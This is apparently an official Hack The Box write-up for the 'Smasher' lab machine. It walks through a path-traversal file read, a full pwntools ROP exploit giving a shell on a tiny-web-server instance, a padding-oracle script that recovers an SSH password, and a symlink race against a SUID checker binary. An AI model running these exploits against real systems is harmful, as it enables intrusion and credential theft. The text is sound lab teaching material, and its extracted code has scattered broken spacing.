@@ -1,0 +1,421 @@
+Smasher
+
+14th July 2018 / Document No D18.100.28
+
+Prepared By: MinatoTW
+Machine Author: dzonerzy
+Difficulty: Insane
+Classification: Official
+
+                                                                       Page 1 / 23
+SYNOPSIS
+
+Smasher is a very challenging machine, that requires exploit development, scripting, source code
+review and Linux exploitation skills. A vulnerable web server is found to be running, which can be
+exploited to gain a shell using ROP. A program running on a port locally is vulnerable to padding
+oracle and can be exploited to gain sensitive information. After logging in, the user is found to
+have access to a SUID file which can be exploited due to a race condition.
+
+Skills Required                       Skills Learned
+
+ Knowledge of source code review and   Binary file fuzzing
+    fuzzing techniques                 Exploit development
+                                       Binary file reversing
+ Knowledge of reversing techniques     Padding Oracle exploitation
+ Intermediate Python skills
+
+                                                                    Page 2 / 23
+ENUMERATION
+NMAP
+
+ ports=$(nmap -p- --min-rate=1000 -T4 1 0.10.10.89 | grep ^[0 -9] | cut -d
+ '/' -f 1 | tr '\n' ' ,' | sed s/,$//)
+ nmap -p$ports -sC -sV 10.10.10.89
+
+Nmap reveals that SSH is available, as well as "shenfeng tiny-web-server" running on port 1111.
+
+FILE INCLUSION
+
+After a quick search online we find the source code on github. Looking at the issues we find
+there's a file inclusion vulnerability.
+
+                                                                                                                 Page 3 / 23
+After requesting /../../../../../etc/passwd we receive the contents of the passwd file.
+Looking at the home folder we find the user www.
+
+                                                                                                                 Page 4 / 23
+The folder contains a subfolder "tiny-web-server" which contains the source code for the web
+server.
+
+Looking at the Makefile we see the compilation options to disable stack protection and make the
+stack executable.
+
+Download the source code, and then download the original repository to diff the code.
+ wget 10.10.10.89:1111//home/www/tiny-web-server/tiny
+ wget 10.10.10.89:1111//home/www/tiny-web-server/tiny.c
+ git c lone https://github.com/shenfeng/tiny-web-server
+ vimdiff tiny.c tiny-web-server/tiny.c
+
+We see that code on the box (left) was edited to remove the loop which creates child processes.
+This will help us stay on the parent process and exploit it.
+
+                                                                                                                 Page 5 / 23
+EXPLOIT DEVELOPMENT
+
+Looking at the binary properties using checksec:
+
+We see that NX is disabled which we already know from the makefile and PIE is turned off too
+which leads to constant addresses within the binary. As ASLR is turned on by default on Linux
+we'll assume that it's active on the box.
+
+FINDING THE CRASH
+
+Looking at the source code, the main() function calls the process function after setting up all the
+variables.
+
+                                                                                                                 Page 6 / 23
+The process() function creates a child process for each request and then calls parse-request with
+a http_request struct.
+
+Looking at the definition of the http_request object we see that it contains a buffer for the
+filename and markers for offset and end.
+
+The parse_request() function ends up calling url_decode() with the requested filename and
+MAXLINE which is defined as 1024 bytes,
+
+The url_decode() function copies 1024 bytes of data into the filename buffer, which is just 512
+bytes in size.
+
+                                                                                                                 Page 7 / 23
+This leads to a buffer overflow which will let us control the RIP. Let's verify this using gdb. Set
+follow-fork-mode to child to keep track of the fork process.
+ gdb -q tiny -ex r
+ curl localhost:9999/$(python -c "print 'A'*1024")
+We see that it received a Segmentation fault and crashed.
+
+                                                                                                                 Page 8 / 23
+Let's calculate the offset to overwrite now. Generate a pattern now using msf-pattern_create.
+Restart the program and send a request:
+ curl localhost:9999/$(msf-pattern_create -l 1024)
+After the crash, looking at the RSP value:
+
+And we see that the offset is 568 which is the space we have for our payload. This can be
+verified by sending extra B's at the end.
+
+With this information we can start constructing our ROP chain. The first step would be to leak the
+address of libc.
+To achieve this we'll use the puts or write syscall depending on which is available in the binary.
+
+                                                                                                                 Page 9 / 23
+We see that puts isn't present but write is. Looking at it's man page we see that it takes in three
+arguments.
+
+The file descriptor, the buffer and the size to print. In 64 bit assembly the syscalls are made using
+registers where RAX stores the syscall number, RDI stores the first argument, RSI stores the
+second, RDX the third and so on. In order to store the required values in these registers we'll use
+the POP instruction. A POP instruction pops the top of the stack in the required register. For
+example: POP RDI would place the value from the top of the stack into RDI.
+First we'll set RDI to 4, because by default the fd is 3 and is incremented on each request. We'll
+need a POP RDI to achieve this. The ropsearch command in peda helps us find the instruction.
+
+                                                                                                                Page 10 / 23
+We can choose any one of the above as long as it doesn't have null bytes in between. The next
+argument we need is the address to be printed. We'll print the address for the read syscall. Let's
+find it first using objdump.
+
+It's address is found to be 0x603088. The second argument is to be placed in RSI. This can be
+achieved using a POP RSI instruction.
+
+We find that POP RSI isn't available on it's own but we have POP RSI; POP R15 available and
+because we don't care about R15 it can be set to anything. As for the last argument, it can be
+safely ignored.
+The first part of our exploit can now be constructed.
+ import urllib
+ from pwn i mport *
+ context.bits = 64
+ context.arch = ' amd64'
+ context.endian = 'little'
+ host = '127.0.0.1'
+ port = 9 999
+ pop_rsi = p64(0x4011db)
+ addr_read = p64(0x603088)
+ r15 = p64(0xdeadbeef)
+ pop_rdi = p64(0 x4011dd)
+ fd = p64(0 x4)
+ addr_write = p64(0 x400c50)
+
+                                                                                                                 Page 11 / 23
+ sock = remote(host, port)
+ buf = ' A' * 5 68
+ buf += pop_rsi # pops the read syscall address into rsi
+ buf += addr_read
+ buf += r15 # garbage for r15
+ buf += pop_rdi # pops fd into rdi
+ buf += fd
+ buf += addr_write # write syscall
+ url = " ""GET /{} HTTP/1.1\r\nHost:
+ smasher.htb\r\n\r\n""".format(urllib.quote(buf))
+ sock.send(url)
+ sock.recvuntil(" File not found")
+ response = sock.recv()
+ leak = u64(response[:8] )
+ log.info(" Leaked address: {}".format(hex(leak)))
+The script uses pwntools to send the request through the socket. As discussed earlier, our ROP
+chain consists of POP RSI followed by address for read, and some junk for r15 followed by POP
+RDI which pops the file descriptor. We'll use urllib.quote to make it properly URL encoded. Now
+running the script should leak the address for read@GOT.
+
+Now using this we can find the libc offset which is randomised each time the server is restarted.
+First download libc from the box.
+ wget http://10.10.10.89:1111//lib/x86_64-linux-gnu/libc.so. 6 -O libc.so. 6
+
+                                                                                                                Page 12 / 23
+Using readelf we can find the address for the read function.
+
+The address is found to be 0x0f7250. This can be used to calculate the base address for libc.
+ libc_base = leaked_read - 0 x0f7250
+Now we need to find the offsets for system function and the string "/bin/sh".
+
+Adding this to the exploit code:
+ system = libc_base + 0 x45390
+ sh = libc_base + 0x18cd57
+
+Now, in order to get the output of our commands we'll use the dup2 syscall which will duplicate
+the existing file descriptor.
+
+Find its address in libc.
+
+                           Page 13 / 23
+ dup2 = libc_base + 0 xf7970
+
+We\ll duplicate the stdin and stdout file descriptors which is equivalent to:
+ dup2( 4 , 0  );
+ dup2( 4, 1  );
+
+Once again we can use POP RSI and POP RDI to place arguments.
+
+FOOTHOLD
+
+Using all the above information we can construct out final ROP chain and exploit.
+ import urllib
+ from pwn import *
+
+ context.bits = 64
+ context.arch = ' amd64'
+ context.endian = ' little'
+
+ host = '10.10.10.89'
+ port = 1111
+
+ pop_rsi = p64(0x4011db)
+ addr_read = p64(0 x603088)
+ r15 = p64(0 xdeadbeef)
+ pop_rdi = p64(0x4011dd)
+ fd = p64(0x4)
+ addr_write = p64(0 x400c50)
+
+ log.info("First ROP Chain")
+ sock = remote(host, port)
+
+ buf = ' A' * 5 68
+
+                                                                                                                Page 14 / 23
+buf += pop_rsi
+buf += addr_read
+buf += r15
+buf += pop_rdi
+buf += fd
+buf += addr_write
+
+url = """GET /{} HTTP/1.1\r\nHost:
+smasher.htb\r\n\r\n""". format(urllib.quote(buf))
+
+sock.send(url)
+
+sock.recvuntil("File not found")
+response = sock.recv()
+leak = u64(response[:8 ] )
+sock.close()
+
+libc_base = leak - 0x0f7250
+system = libc_base + 0 x45390
+sh = libc_base + 0 x18cd57
+dup2 = libc_base + 0xf7970
+
+log.info(' leaked address : {}'. format(hex(leak)))
+log.info(" Second ROP Chain")
+
+sock = remote(host, port)
+
+# To call dup2(4, 0)
+buf = ' A' * 5 68
+buf += pop_rsi
+buf += p64(0 x0)
+buf += r15
+buf += pop_rdi
+buf += fd
+buf += p64(dup2)
+
+# To call dup2(4, 1)
+buf += pop_rsi
+buf += p64(0 x1)
+
+                                                     Page 15 / 23
+ buf += r15
+ buf += pop_rdi
+ buf += fd
+ buf += p64(dup2)
+ # Calling system('/bin/sh')
+ buf += pop_rdi
+ buf += p64(sh)
+ buf += p64(system)
+ url = """GET /{} HTTP/1.1\r\nHost:
+ smasher.htb\r\n\r\n""".format(urllib.quote(buf))
+ sock.send(url)
+ sock.recvuntil(" File not found")
+ sock.interactive()
+As discussed earlier our second ROP chain duplicates the stdin and stdout fd's and executes
+/bin/sh. Running the exploit gives us a shell as www.
+
+                                                                                                                Page 16 / 23
+LATERAL MOVEMENT
+
+Looking at the listening ports locally we see that a 1337 is active.
+
+To easily interact with it we can run socat and forward the port to all interfaces. A static binary for
+socat can be found h ere. Download it and transfer it to the box.
+ wget
+ https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_6
+ 4/socat
+ python3 -m http.server 80 # locally
+ wget 10.10.14.12/socat -O /tmp/socat
+ chmod +x /tmp/socat
+ /tmp/socat tcp-listen:5555,fork,reuseaddr tcp:127.0.0.1:1337 &
+And now we can directly connect it via port 5555 on the box.
+ nc 10.10.10.89 5555
+
+The program is some kind of "AES Checker" which provides ciphertext and expects some
+ciphertext. Sending an empty value it responds with "Generic error".
+
+                                                                                                                Page 17 / 23
+Sending the same ciphertext , we receive "Hash is ok".
+
+Sending it different kinds of values we receive an "Invalid padding" error for 64 A's.
+
+This can be concluded as a type of padding oracle attack where we can decrypt the blocks by
+checking if the padding is correct or not. This can be achieved using the python p addingoracle
+library.
+ git clone https://github.com/mwielgoszewski/python-paddingoracle
+ cd python-paddingoracle
+
+And then create the following script:
+
+ # -*- coding: utf-8 -*-
+ from paddingoracle import BadPaddingException, PaddingOracle
+ from base64 i mport b64encode, b64decode
+ from urllib i mport quote, unquote
+ import requests
+ import socket
+ import time
+ class P adBuster( PaddingOracle):
+
+           def __init__(self, **kwargs):
+              super(PadBuster, self).__init__(**kwargs)
+              self.session = requests.Session()
+              self.wait = kwargs.get(' wait', 2.0)
+
+           def o racle(self, data, **kwargs):
+              somecookie = (b64encode(data))
+              p rint somecookie + "\r",
+
+                                                                                                                Page 18 / 23
+              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+              s.connect(("10.10.10.89", 5 555) )
+              d = " "
+
+              w hile ' Insert ciphertext: ' n ot i n d:
+                     d = s.recv(2 56)
+
+                     c = s.send(somecookie+'\n')
+                     r = s.recv(2 56)
+
+           if 'Invalid Padding!' not i n r:
+
+                     sys.stdout.write('Found: ')
+                     sys.stdout.flush()
+                     print
+                     return
+
+           raise BadPaddingException
+
+ if __name__ == ' __main__':
+           import logging
+           import sys
+
+           if n ot sys.argv[1 :]:
+           print 'Usage: %s <somecookie value>' % (sys.argv[0 ] , )
+           sys.exit(1 )
+           logging.basicConfig(level=logging.INFO)
+           encrypted_cookie = b64decode(unquote(sys.argv[1 ]))
+           padbuster = PadBuster()
+           cookie = padbuster.decrypt(encrypted_cookie, block_size=16,
+ iv=bytearray(8) )
+           print(' Decrypted somecookie: %s => %r' % (sys.argv[1 ], cookie))
+
+The script uses the paddingoracle library to send encrypted values to the program and tries to
+decrypt it based on the error message. Execute it with the encrypted ciphertext as the argument.
+
+ python smasher-paddingoracle.py
+ irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqL
+
+                                                                                                                Page 19 / 23
+ YITGGpPsXdg==
+The script takes a while to decrypt all the blocks.
+ # python smasher-paddingoracle.py
+ irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqL
+ YITGGpPsXdg==
+ Found: AAAAAAAAAAAAAc4q0Zlge6CUjG7QQuELqAdc=
+ Found: AAAAAAAAAAABtcIq0Zlge6CUjG7QQuELqAdc=
+ Found: AAAAAAAAAAGVscYq0Zlge6CUjG7QQuELqAdc=
+ Found: AAAAAAAAAJGJrdoq0Zlge6CUjG7QQuELqAdc=
+ Found: AAAAAAABhJWNqd4q0Zlge6CUjG7QQuELqAdc=
+ ---------------------------- SNIP --------------------
+ INFO:PadBuster:Decrypted block 0 : 'SSH password for'
+ Found: AAAAAAAAAAAAA9nDC08NI06MbcWEOc94q0OU=
+ Found: AAAAAAAAAAAAk9XDC08NI06MbcWEOc94q0OU=
+ Found: AAAAAAAAAAJsl9HDC08NI06MbcWEOc94q0OU=
+ ---------------------------- SNIP --------------------
+ bytearray(b "SSH password for user \'smasher\' is:
+ PaddingOracleMaster123\x06\x06\x06\x06\x06\x06")
+After which we received the password for the user smasher as "PaddingOracleMaster123" which
+can be used to login via SSH.
+
+                                                                                                               Page 20 / 23
+PRIVILEGE ESCALATION
+
+Enumerating the SUID files on the box we come across a binary named checker.
+
+Running the binary needs some arguments which seems to be filenames.
+
+We create a file and add some contents in it and then run the binary.
+ echo abc > file
+ checker file
+We see that it just prints out it's contents along with the owner's uid.
+
+                                                                                                                Page 21 / 23
+Running strace on the binary we see that it checks if we have permissions to read the file or not.
+
+And then sets the uid and gid to 0 followed by a sleep. If we can trigger a race condition such
+that the file is owned by us before the check, and is then symlinked to a sensitive file after the
+check, we might be able to read sensitive files like root.txt.
+The following script lets us trigger that race condition.
+ rm file
+ echo abc > file
+ checker file &
+ sleep 0 .5
+ rm file
+ ln -s /root/root.txt file
+
+                                                                                                               Page 22 / 23
+Page 23 / 23
+
